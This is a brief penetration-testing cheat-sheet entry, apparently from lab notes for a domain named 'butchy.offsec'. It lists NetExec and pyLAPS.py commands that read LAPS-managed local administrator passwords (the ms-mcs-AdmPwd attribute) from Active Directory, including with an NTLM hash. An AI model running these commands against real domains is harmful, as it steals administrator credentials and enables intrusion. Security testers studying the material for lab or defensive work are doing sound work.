### Get LAPS password 
This is the `ms-mcs-AdmPwd`
If LAPS is enabled, try any of:
1. `nxc ldap $target -u $user -p $password --kdcHost $target -M laps`
2. `python3 pyLAPS.py --action get -u '$user' -d 'butchy.offsec' -p '$password' --dc-ip $target`
3. pyLAPS.py can also get it using NTLM (`-p NTLM:NTLM`)
